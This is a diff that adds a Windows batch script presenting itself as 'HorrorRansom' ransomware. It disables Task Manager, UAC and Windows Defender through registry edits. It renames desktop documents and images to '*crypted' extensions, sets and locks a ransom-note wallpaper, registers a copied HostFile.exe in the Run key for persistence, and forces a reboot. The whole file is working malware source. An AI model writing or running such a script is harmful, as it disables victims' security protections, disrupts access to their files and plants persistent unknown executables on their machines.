@@ -1,0 +1,23 @@
+@echo off
+rem if this is broken then i'm very mad
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+del c:\note.bmp /q
+copy /y note.bmp c:\note.bmp
+del c:\HostFile.exe /q
+copy /y HostFile.exe c:\HostFile.exe
+title You Are F*cked by HorrorRansom Ransomware
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\note.bmp /f
+ren %userprofile%\desktop\*.doc *.doccrypted
+ren %userprofile%\desktop\*.xls *.xlscrypted
+ren %userprofile%\desktop\*.ppt *.pptcrypted
+ren %userprofile%\desktop\*.zip *.zipcrypted
+ren %userprofile%\desktop\*.txt *.txtcrypted
+ren %userprofile%\desktop\*.png *.pngcrypted
+ren %userprofile%\desktop\*.jpg *.jpgcrypted
+ren %userprofile%\desktop\*.bmp *.bmpcrypted
+ren %userprofile%\desktop\*.gif *.gifcrypted
+reg.exe ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoChangingWallPaper /t REG_DWORD /d 1 /f
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "death666" /t REG_SZ /F /D "C:\HostFile.exe"
+shutdown /r /t 00
